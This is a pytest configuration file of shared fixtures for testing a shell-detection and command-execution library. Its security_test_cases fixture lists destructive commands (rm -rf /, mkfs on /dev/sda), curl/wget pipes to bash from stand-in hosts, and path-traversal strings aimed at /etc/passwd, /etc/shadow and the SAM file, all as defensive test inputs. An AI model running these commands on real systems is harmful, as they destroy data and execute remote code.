"""
Pytest Configuration and Shared Fixtures for Tool Usage Testing
================================================================

Shared fixtures and configuration for the mini-biai-1 tool usage test suite.
Provides comprehensive test infrastructure for testing shell detection,
command execution, tool registry, optimization, and security features.
"""

import pytest
import os
import sys
import tempfile
import shutil
import subprocess
import platform
from pathlib import Path
from unittest.mock import MagicMock, Mock, patch, mock_open
from typing import Dict, Any, List, Optional, Union
from dataclasses import dataclass
import time
import json
import csv
import threading
from concurrent.futures import ThreadPoolExecutor
import random

# Add the source directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

# Import tool_usage components with error handling
try:
    # Import individual modules to avoid circular imports
    from tool_usage.shell_detector import ShellDetector
    from tool_usage.command_executor import CommandExecutor, CommandResult, ExecutionConfig, SecurityLevel, ExecutionMode
    from tool_usage.tool_registry import ToolRegistry, ToolMetadata, ToolCategory, ToolStatus
    from tool_usage.usage_optimizer import UsageOptimizer
    from tool_usage.platform_adapter import PlatformAdapter, PosixAdapter, WindowsAdapter, get_platform_adapter
    from tool_usage import ShellInfo, ToolUsageManager, get_platform_handler, test_platform_handlers
    
    # Import handlers
    from tool_usage.handlers.base_handler import BaseCommandHandler
    from tool_usage.handlers.unix_shell_handler import UnixShellHandler
    from tool_usage.handlers.powershell_handler import PowerShellHandler
    from tool_usage.handlers.windows_command_handler import WindowsCommandHandler
    from tool_usage.handlers.wsl_handler import WSLHandler
    from tool_usage.handlers.ssh_handler import SSHHandler
    
    # Import security components
    from tool_usage.security.security_validator import SecurityValidator
    from tool_usage.security.sandbox import Sandbox
    from tool_usage.security.safety_modes import SafetyModes
    from tool_usage.security.audit_logger import AuditLogger
    
    IMPORTS_AVAILABLE = True
    
    # Import intelligence components
    from tool_usage.intelligence import (
        PatternAnalyzer, ToolDiscovery, Analytics
    )
except ImportError as e:
    print(f"Warning: Could not import tool_usage components: {e}")
    # Create mock classes for testing purposes
    class MockShellDetector:
        pass
    
    class MockCommandExecutor:
        pass
    
    class MockToolRegistry:
        pass
    
    # Set up mocks
    ShellDetector = MockShellDetector
    CommandExecutor = MockCommandExecutor
    ToolRegistry = MockToolRegistry


# Global test configuration
pytest_plugins = []


@pytest.fixture(scope="session", autouse=True)
def setup_tool_usage_test_environment():
    """Setup test environment for the entire tool usage test session"""
    # Set test-specific environment variables
    os.environ['TESTING_TOOL_USAGE'] = 'true'
    os.environ['TOOL_USAGE_SECURITY_LEVEL'] = 'medium'
    os.environ['PYTHONPATH'] = str(Path(__file__).parent.parent.parent / "src")
    
    # Ensure consistent test behavior across platforms
    os.environ['LANG'] = 'C'
    os.environ['LC_ALL'] = 'C'
    
    yield
    
    # Cleanup after all tests
    for key in ['TESTING_TOOL_USAGE', 'TOOL_USAGE_SECURITY_LEVEL']:
        if key in os.environ:
            del os.environ[key]


# Platform Detection Fixtures
@pytest.fixture
def mock_platform_linux():
    """Mock Linux platform for testing"""
    with patch('platform.system', return_value='Linux'), \
         patch('platform.machine', return_value='x86_64'), \
         patch('platform.platform', return_value='Linux-5.4.0-74-generic-x86_64'):
        
        with patch('os.name', 'posix'), \
             patch('os.pathsep', ':'), \
             patch('os.sep', '/'):
            
            yield


@pytest.fixture
def mock_platform_windows():
    """Mock Windows platform for testing"""
    with patch('platform.system', return_value='Windows'), \
         patch('platform.machine', return_value='AMD64'), \
         patch('platform.platform', return_value='Windows-10-10.0.19041-SP0'):
        
        with patch('os.name', 'nt'), \
             patch('os.pathsep', ';'), \
             patch('os.sep', '\\'):
            
            yield


@pytest.fixture
def mock_platform_macos():
    """Mock macOS platform for testing"""
    with patch('platform.system', return_value='Darwin'), \
         patch('platform.machine', return_value='arm64'), \
         patch('platform.platform', return_value='Darwin-21.6.0-arm64-arm'):
        
        with patch('os.name', 'posix'), \
             patch('os.pathsep', ':'), \
             patch('os.sep', '/'):
            
            yield


# Platform Adapter Fixtures
@pytest.fixture
def posix_adapter():
    """Create POSIX platform adapter for testing"""
    return PosixAdapter()


@pytest.fixture
def windows_adapter():
    """Create Windows platform adapter for testing"""
    return WindowsAdapter()


# Shell Detection Fixtures
@pytest.fixture
def mock_shell_info():
    """Create mock shell info"""
    return ShellInfo(
        name="bash",
        path="/bin/bash",
        version="5.1.4",
        is_available=True,
        capabilities={'interactive', 'login', 'scripting', 'aliases'},
        type="interactive"
    )


@pytest.fixture
def shell_detector_mock():
    """Create mock shell detector with test data"""
    detector = Mock(spec=ShellDetector)
    
    # Mock methods
    detector.get_current_shell.return_value = ShellInfo(
        name="bash", path="/bin/bash", version="5.1.4",
        is_available=True, capabilities={'interactive', 'scripting'}
    )
    
    detector.get_available_shells.return_value = [
        ShellInfo("bash", "/bin/bash", "5.1.4", True, {'interactive', 'scripting'}),
        ShellInfo("zsh", "/bin/zsh", "5.8", True, {'interactive', 'scripting', 'completion'}),
        ShellInfo("sh", "/bin/sh", None, True, {'scripting'})
    ]
    
    detector.get_shell_by_name.return_value = ShellInfo(
        "bash", "/bin/bash", "5.1.4", True, {'interactive', 'scripting'}
    )
    
    detector.get_default_shell.return_value = ShellInfo(
        "bash", "/bin/bash", "5.1.4", True, {'interactive', 'scripting'}
    )
    
    return detector


@pytest.fixture
def shell_detector_real():
    """Create real shell detector for testing"""
    try:
        return ShellDetector()
    except Exception:
        # Return mock if real detector fails
        return shell_detector_mock()


# Command Execution Fixtures
@pytest.fixture
def mock_command_result():
    """Create mock command result"""
    return CommandResult(
        command="echo 'test'",
        stdout="test\n",
        stderr="",
        return_code=0,
        execution_time=0.01,
        timestamp=time.time(),
        pid=1234,
        success=True
    )


@pytest.fixture
def execution_config():
    """Create execution configuration for testing"""
    return ExecutionConfig(
        mode=ExecutionMode.SYNCHRONOUS,
        timeout=30.0,
        security_level=SecurityLevel.MEDIUM,
        working_directory=None,
        environment_vars=None
    )


@pytest.fixture
def command_executor_mock():
    """Create mock command executor"""
    executor = Mock(spec=CommandExecutor)
    
    # Mock methods
    executor.execute.return_value = CommandResult(
        command="echo test",
        stdout="test\n",
        stderr="",
        return_code=0,
        execution_time=0.01,
        timestamp=time.time(),
        pid=1234,
        success=True
    )
    
    executor.execute_interactive.return_value = CommandResult(
        command="interactive command",
        stdout="interactive output\n",
        stderr="",
        return_code=0,
        execution_time=0.05,
        timestamp=time.time(),
        pid=5678,
        success=True
    )
    
    executor.execute_background.return_value = CommandResult(
        command="background command",
        stdout="",
        stderr="",
        return_code=0,
        execution_time=0.001,
        timestamp=time.time(),
        pid=9999,
        success=True
    )
    
    return executor


@pytest.fixture
def command_executor_real():
    """Create real command executor for testing"""
    try:
        adapter = get_platform_adapter()
        return CommandExecutor(adapter)
    except Exception:
        return command_executor_mock()


# Tool Registry Fixtures
@pytest.fixture
def mock_tool_metadata():
    """Create mock tool metadata"""
    return ToolMetadata(
        name="python",
        category=ToolCategory.PROGRAMMING_LANGUAGE,
        path="/usr/bin/python",
        version="3.9.7",
        status=ToolStatus.AVAILABLE,
        description="Python programming language",
        tags={'language', 'scripting', 'development'},
        capabilities={'execute', 'script'},
        last_updated=time.time()
    )


@pytest.fixture
def tool_registry_mock():
    """Create mock tool registry"""
    registry = Mock(spec=ToolRegistry)
    
    # Mock methods
    registry.get_tool.return_value = ToolMetadata(
        name="python",
        category=ToolCategory.PROGRAMMING_LANGUAGE,
        path="/usr/bin/python",
        version="3.9.7",
        status=ToolStatus.AVAILABLE,
        description="Python programming language"
    )
    
    registry.get_tools_by_category.return_value = [
        ToolMetadata("python", ToolCategory.PROGRAMMING_LANGUAGE, "/usr/bin/python", "3.9.7"),
        ToolMetadata("node", ToolCategory.PROGRAMMING_LANGUAGE, "/usr/bin/node", "16.0.0")
    ]
    
    registry.search_tools.return_value = [
        ToolMetadata("python", ToolCategory.PROGRAMMING_LANGUAGE, "/usr/bin/python", "3.9.7")
    ]
    
    registry.register_tool.return_value = True
    registry.update_tool_status.return_value = True
    
    return registry


@pytest.fixture
def tool_registry_real():
    """Create real tool registry for testing"""
    try:
        adapter = get_platform_adapter()
        return ToolRegistry(adapter)
    except Exception:
        return tool_registry_mock()


# Usage Optimizer Fixtures
@pytest.fixture
def usage_optimizer_mock():
    """Create mock usage optimizer"""
    optimizer = Mock(spec=UsageOptimizer)
    
    # Mock optimization result
    mock_result = Mock()
    mock_result.success = True
    mock_result.optimized_command = "optimized command"
    mock_result.improvement_score = 0.25
    mock_result.estimated_time_saved = 0.1
    
    optimizer.optimize_command.return_value = mock_result
    optimizer.batch_optimize.return_value = [mock_result]
    optimizer.analyze_usage_patterns.return_value = []
    optimizer.get_optimization_recommendations.return_value = [
        {"type": "performance", "description": "Use faster alternatives"}
    ]
    
    return optimizer


@pytest.fixture
def usage_optimizer_real():
    """Create real usage optimizer for testing"""
    try:
        adapter = get_platform_adapter()
        executor = CommandExecutor(adapter)
        registry = ToolRegistry(adapter)
        return UsageOptimizer(adapter, executor, registry)
    except Exception:
        return usage_optimizer_mock()


# Tool Usage Manager Fixtures
@pytest.fixture
def tool_usage_manager_mock():
    """Create mock tool usage manager"""
    manager = Mock(spec=ToolUsageManager)
    
    # Mock methods
    manager.execute_command.return_value = mock_command_result()
    manager.get_available_shells.return_value = [mock_shell_info()]
    manager.discover_tools.return_value = [mock_tool_metadata()]
    manager.optimize_command.return_value = Mock(success=True, optimized_command="optimized")
    
    return manager


@pytest.fixture
def tool_usage_manager_real():
    """Create real tool usage manager for testing"""
    try:
        return ToolUsageManager(auto_discovery=False)
    except Exception:
        return tool_usage_manager_mock()


# Security and Safety Fixtures
@pytest.fixture
def security_validator_mock():
    """Create mock security validator"""
    validator = Mock()
    validator.validate_command.return_value = True
    validator.validate_path.return_value = True
    validator.validate_environment.return_value = True
    return validator


@pytest.fixture
def sandbox_mock():
    """Create mock sandbox"""
    sandbox = Mock()
    sandbox.execute.return_value = CommandResult(
        command="sandboxed command",
        stdout="sandboxed output",
        stderr="",
        return_code=0,
        execution_time=0.01,
        timestamp=time.time(),
        success=True
    )
    sandbox.create_context.return_value = {"sandbox_id": "test_sandbox"}
    sandbox.cleanup.return_value = True
    return sandbox


# Handler Fixtures
@pytest.fixture
def unix_handler_mock():
    """Create mock Unix shell handler"""
    handler = Mock(spec=UnixShellHandler)
    handler.is_platform_supported.return_value = True
    handler.execute_command.return_value = Mock(
        success=True,
        stdout="unix output",
        stderr="",
        return_code=0
    )
    return handler


@pytest.fixture
def powershell_handler_mock():
    """Create mock PowerShell handler"""
    handler = Mock(spec=PowerShellHandler)
    handler.is_platform_supported.return_value = True
    handler.execute_command.return_value = Mock(
        success=True,
        stdout="powershell output",
        stderr="",
        return_code=0
    )
    return handler


@pytest.fixture
def cmd_handler_mock():
    """Create mock Windows Command handler"""
    handler = Mock(spec=WindowsCommandHandler)
    handler.is_platform_supported.return_value = True
    handler.execute_command.return_value = Mock(
        success=True,
        stdout="cmd output",
        stderr="",
        return_code=0
    )
    return handler


# Environment and File System Fixtures
@pytest.fixture
def temp_test_dir():
    """Create temporary directory for test data"""
    temp_dir = tempfile.mkdtemp(prefix="tool_usage_test_")
    yield Path(temp_dir)
    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def test_files(temp_test_dir):
    """Create test files in temporary directory"""
    # Create various test files
    test_file = temp_test_dir / "test.txt"
    test_file.write_text("Hello, World!\nThis is a test file.\n")
    
    python_script = temp_test_dir / "test_script.py"
    python_script.write_text("print('Hello from Python!')\n")
    
    shell_script = temp_test_dir / "test_script.sh"
    shell_script.write_text("#!/bin/bash\necho 'Hello from Bash!'\n")
    
    json_data = temp_test_dir / "test_data.json"
    json_data.write_text('{"name": "test", "value": 42}')
    
    csv_data = temp_test_dir / "test_data.csv"
    csv_data.write_text("name,age,city\nJohn,25,New York\nJane,30,San Francisco\n")
    
    return {
        'text_file': test_file,
        'python_script': python_script,
        'shell_script': shell_script,
        'json_file': json_data,
        'csv_file': csv_data,
        'dir': temp_test_dir
    }


@pytest.fixture
def mock_processes():
    """Create mock process information"""
    return {
        '1234': {'pid': 1234, 'name': 'python', 'status': 'running'},
        '5678': {'pid': 5678, 'name': 'bash', 'status': 'running'},
        '9999': {'pid': 9999, 'name': 'node', 'status': 'stopped'}
    }


# Performance and Load Testing Fixtures
@pytest.fixture
def performance_monitor():
    """Create performance monitor for testing"""
    class PerformanceMonitor:
        def __init__(self):
            self.start_time = None
            self.end_time = None
            self.metrics = {
                'execution_times': [],
                'memory_usage': [],
                'cpu_usage': [],
                'success_count': 0,
                'error_count': 0
            }
        
        def start(self):
            self.start_time = time.time()
        
        def stop(self):
            self.end_time = time.time()
        
        def record_execution(self, execution_time: float, success: bool):
            self.metrics['execution_times'].append(execution_time)
            if success:
                self.metrics['success_count'] += 1
            else:
                self.metrics['error_count'] += 1
        
        def record_memory(self, memory_mb: float):
            self.metrics['memory_usage'].append(memory_mb)
        
        def record_cpu(self, cpu_percent: float):
            self.metrics['cpu_usage'].append(cpu_percent)
        
        def get_stats(self) -> Dict[str, Any]:
            if not self.metrics['execution_times']:
                return {}
            
            import statistics
            
            return {
                'execution_time': {
                    'mean': statistics.mean(self.metrics['execution_times']),
                    'median': statistics.median(self.metrics['execution_times']),
                    'min': min(self.metrics['execution_times']),
                    'max': max(self.metrics['execution_times']),
                    'count': len(self.metrics['execution_times'])
                },
                'success_rate': self.metrics['success_count'] / (self.metrics['success_count'] + self.metrics['error_count']),
                'memory_usage': {
                    'mean': statistics.mean(self.metrics['memory_usage']) if self.metrics['memory_usage'] else 0,
                    'max': max(self.metrics['memory_usage']) if self.metrics['memory_usage'] else 0
                } if self.metrics['memory_usage'] else {},
                'cpu_usage': {
                    'mean': statistics.mean(self.metrics['cpu_usage']) if self.metrics['cpu_usage'] else 0,
                    'max': max(self.metrics['cpu_usage']) if self.metrics['cpu_usage'] else 0
                } if self.metrics['cpu_usage'] else {}
            }
    
    return PerformanceMonitor()


@pytest.fixture
def load_test_config():
    """Create load test configuration"""
    return {
        'concurrent_users': [1, 5, 10, 20, 50],
        'commands_per_user': 10,
        'test_duration': 60,  # seconds
        'ramp_up_time': 10,   # seconds
        'metrics_collection_interval': 1,  # seconds
        'timeout': 30,  # seconds
        'security_levels': [SecurityLevel.LOW, SecurityLevel.MEDIUM, SecurityLevel.HIGH]
    }


# Cross-Platform Compatibility Fixtures
@pytest.fixture
def cross_platform_test_cases():
    """Define test cases for cross-platform compatibility"""
    return {
        'basic_commands': {
            'linux': ['ls -la', 'echo "test"', 'pwd', 'whoami'],
            'windows': ['dir', 'echo test', 'cd', 'whoami'],
            'macos': ['ls -la', 'echo "test"', 'pwd', 'whoami']
        },
        'shell_specific': {
            'bash': ['echo $BASH_VERSION', 'alias ll="ls -la"', 'source ~/.bashrc'],
            'zsh': ['echo $ZSH_VERSION', 'setopt histexpand', 'autoload -U compinit'],
            'powershell': ['Get-Host', '$PSVersionTable', 'Get-Command'],
            'cmd': ['ver', 'set', 'echo %PATH%']
        },
        'path_handling': {
            'posix': ['/tmp/test', './relative/path', '../parent/path', '~/home/path'],
            'windows': ['C:\\Windows\\test', '.\\relative\\path', '..\\parent\\path', '%USERPROFILE%\\path']
        }
    }


# Security Test Data
@pytest.fixture
def security_test_cases():
    """Define security test cases"""
    return {
        'safe_commands': [
            'echo "hello world"',
            'ls -la /tmp',
            'pwd',
            'whoami'
        ],
        'dangerous_commands': [
            'rm -rf /',
            'format C:',
            'del /s *.*',
            'sudo rm -rf /',
            '> /dev/sda',
            'mkfs.ext4 /dev/sda'
        ],
        'suspicious_patterns': [
            'curl http://malicious.site | bash',
            'wget http://evil.com/script.sh | sh',
            'eval malicious_code',
            'exec rm -rf /',
            'system("dangerous command")'
        ],
        'path_traversal': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/../../../etc/shadow',
            '....//....//....//etc/passwd'
        ]
    }


# Mock Data Generators
@pytest.fixture
def shell_detection_data():
    """Generate test data for shell detection"""
    return {
        'environments': [
            {'shell': 'bash', 'version': '4.4', 'available': True},
            {'shell': 'zsh', 'version': '5.8', 'available': True},
            {'shell': 'fish', 'version': '3.3', 'available': False},
            {'shell': 'powershell', 'version': '7.1', 'available': True},
            {'shell': 'cmd', 'version': '10.0', 'available': True}
        ],
        'current_shells': {
            'linux': 'bash',
            'macos': 'zsh',
            'windows': 'powershell'
        }
    }


@pytest.fixture
def tool_registry_data():
    """Generate test data for tool registry"""
    tools = []
    for i in range(20):
        tools.append(ToolMetadata(
            name=f"tool_{i}",
            category=random.choice(list(ToolCategory)),
            path=f"/usr/bin/tool_{i}",
            version=f"{random.randint(1, 10)}.{random.randint(0, 9)}",
            status=random.choice(list(ToolStatus)),
            description=f"Test tool {i}",
            tags={'test', 'mock'},
            capabilities={'execute'},
            last_updated=time.time()
        ))
    return tools


@pytest.fixture
def command_execution_data():
    """Generate test data for command execution"""
    commands = [
        ('echo "test"', 0.01, True),
        ('ls -la', 0.05, True),
        ('python --version', 0.1, True),
        ('nonexistent command', 0.001, False),
        ('sleep 1', 1.0, True)
    ]
    
    results = []
    for cmd, exec_time, success in commands:
        result = Mock()
        result.command = cmd
        result.stdout = f"output for {cmd}"
        result.stderr = ""
        result.return_code = 0 if success else 1
        result.execution_time = exec_time
        result.success = success
        result.timestamp = time.time()
        result.pid = random.randint(1000, 9999)
        results.append(result)
    
    return results


# Test Utilities
def create_mock_subprocess_result(stdout="", stderr="", returncode=0):
    """Create a mock subprocess result"""
    mock_result = Mock()
    mock_result.stdout = stdout
    mock_result.stderr = stderr
    mock_result.returncode = returncode
    mock_result.communicate.return_value = (stdout, stderr)
    return mock_result


def assert_command_result_valid(result, expected_success: bool = True):
    """Validate command result structure"""
    assert hasattr(result, 'command'), "Result should have command attribute"
    assert hasattr(result, 'success'), "Result should have success attribute"
    assert hasattr(result, 'return_code'), "Result should have return_code attribute"
    assert hasattr(result, 'execution_time'), "Result should have execution_time attribute"
    assert hasattr(result, 'timestamp'), "Result should have timestamp attribute"
    
    if expected_success:
        assert result.success, f"Command should have succeeded: {result.command}"
        assert result.return_code == 0, f"Return code should be 0 for success: {result.command}"
    else:
        assert not result.success, f"Command should have failed: {result.command}"


def assert_shell_info_valid(shell_info: Union[ShellInfo, Mock]):
    """Validate shell info structure"""
    assert hasattr(shell_info, 'name'), "Shell info should have name attribute"
    assert hasattr(shell_info, 'path'), "Shell info should have path attribute"
    assert isinstance(shell_info.name, str), "Shell name should be string"
    assert isinstance(shell_info.path, str), "Shell path should be string"


def assert_tool_metadata_valid(tool_metadata: Union[ToolMetadata, Mock]):
    """Validate tool metadata structure"""
    assert hasattr(tool_metadata, 'name'), "Tool metadata should have name attribute"
    assert hasattr(tool_metadata, 'category'), "Tool metadata should have category attribute"
    assert hasattr(tool_metadata, 'path'), "Tool metadata should have path attribute"
    assert hasattr(tool_metadata, 'status'), "Tool metadata should have status attribute"
    assert isinstance(tool_metadata.name, str), "Tool name should be string"


# Performance Testing Helper Functions
def run_concurrent_executor_tests(executor_func, test_data, concurrent_levels, iterations_per_level):
    """Run executor tests with different concurrent levels"""
    results = {}
    
    for level in concurrent_levels:
        times = []
        successes = 0
        
        for i in range(iterations_per_level):
            def run_test():
                start_time = time.time()
                result = executor_func(test_data[i % len(test_data)])
                end_time = time.time()
                return end_time - start_time, result.success
            
            with ThreadPoolExecutor(max_workers=level) as executor:
                futures = [executor.submit(run_test) for _ in range(level)]
                
                for future in futures:
                    exec_time, success = future.result()
                    times.append(exec_time)
                    if success:
                        successes += 1
        
        results[f'concurrency_{level}'] = {
            'times': times,
            'avg_time': sum(times) / len(times),
            'success_rate': successes / (level * iterations_per_level)
        }
    
    return results


# Make assertions available in tests
pytest.assert_command_result_valid = assert_command_result_valid
pytest.assert_shell_info_valid = assert_shell_info_valid
pytest.assert_tool_metadata_valid = assert_tool_metadata_valid


# Pytest Configuration for Tool Usage Tests
def pytest_configure(config):
    """Configure pytest with custom markers for tool usage tests"""
    config.addinivalue_line(
        "markers", "unit: marks tests as unit tests"
    )
    config.addinivalue_line(
        "markers", "integration: marks tests as integration tests"
    )
    config.addinivalue_line(
        "markers", "security: marks tests as security tests"
    )
    config.addinivalue_line(
        "markers", "performance: marks tests as performance tests"
    )
    config.addinivalue_line(
        "markers", "compatibility: marks tests as cross-platform compatibility tests"
    )
    config.addinivalue_line(
        "markers", "slow: marks tests as slow running"
    )
    config.addinivalue_line(
        "markers", "shell_linux: marks tests specific to Linux shells"
    )
    config.addinivalue_line(
        "markers", "shell_windows: marks tests specific to Windows shells"
    )
    config.addinivalue_line(
        "markers", "shell_macos: marks tests specific to macOS shells"
    )


def pytest_collection_modifyitems(config, items):
    """Automatically mark tests based on their location and content"""
    for item in items:
        # Mark unit tests
        if "unit" in item.nodeid:
            item.add_marker(pytest.mark.unit)
        
        # Mark integration tests
        if "integration" in item.nodeid:
            item.add_marker(pytest.mark.integration)
        
        # Mark security tests
        if "security" in item.nodeid or "safety" in item.nodeid:
            item.add_marker(pytest.mark.security)
        
        # Mark performance tests
        if "performance" in item.nodeid or "load" in item.nodeid:
            item.add_marker(pytest.mark.performance)
        
        # Mark compatibility tests
        if "compatibility" in item.nodeid or "cross_platform" in item.nodeid:
            item.add_marker(pytest.mark.compatibility)
        
        # Mark slow tests
        if any(keyword in item.nodeid for keyword in ["stress", "load", "performance", "concurrent"]):
            item.add_marker(pytest.mark.slow)
        
        # Mark shell-specific tests
        if "shell" in item.nodeid:
            if "linux" in item.nodeid:
                item.add_marker(pytest.mark.shell_linux)
            elif "windows" in item.nodeid:
                item.add_marker(pytest.mark.shell_windows)
            elif "macos" in item.nodeid:
                item.add_marker(pytest.mark.shell_macos)


# Test Environment Setup
@pytest.fixture(autouse=True)
def reset_tool_usage_state():
    """Reset tool usage state before each test"""
    # Reset any global state that might affect tests
    yield
    
    # Cleanup after each test
    # This can include clearing caches, resetting mocks, etc.
    if hasattr(ShellDetector, '_shell_cache'):
        ShellDetector._shell_cache.clear()


# Manual Testing Helpers
@pytest.fixture
def manual_test_helpers():
    """Provide helpers for manual testing"""
    class ManualTestHelpers:
        @staticmethod
        def create_test_script(script_path: Path, content: str):
            """Create a test script file"""
            script_path.write_text(content)
            script_path.chmod(0o755)
            return script_path
        
        @staticmethod
        def create_test_environment(env_vars: Dict[str, str]):
            """Create test environment variables"""
            original_env = {}
            for key, value in env_vars.items():
                original_env[key] = os.environ.get(key)
                os.environ[key] = value
            return original_env
        
        @staticmethod
        def run_interactive_test(command: str, input_data: str = ""):
            """Run an interactive test"""
            import subprocess
            try:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, stderr = process.communicate(input=input_data)
                return {
                    'success': process.returncode == 0,
                    'stdout': stdout,
                    'stderr': stderr,
                    'return_code': process.returncode
                }
            except Exception as e:
                return {
                    'success': False,
                    'stdout': '',
                    'stderr': str(e),
                    'return_code': -1
                }
    
    return ManualTestHelpers()